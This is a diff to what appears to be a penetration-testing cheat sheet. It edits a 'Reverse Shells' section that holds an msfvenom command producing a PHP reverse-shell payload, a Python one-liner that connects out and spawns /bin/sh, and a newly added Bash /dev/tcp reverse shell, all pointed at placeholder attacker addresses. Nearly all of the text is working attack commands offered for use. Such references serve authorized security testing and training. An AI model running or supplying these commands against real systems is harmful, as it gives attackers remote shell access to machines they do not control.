@@ -5,10 +5,17 @@ python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 
 ## Reverse Shells
+Msfvenom - PHP
 ```bash
 msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -f raw -o shell.php
-
+```
+Python
+```python
 export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+Bash
+```bash
+bash -i >& /dev/tcp/10.0.0.1/443 0>&1
 ```
 
 ## Upgrade to a PTY Shell
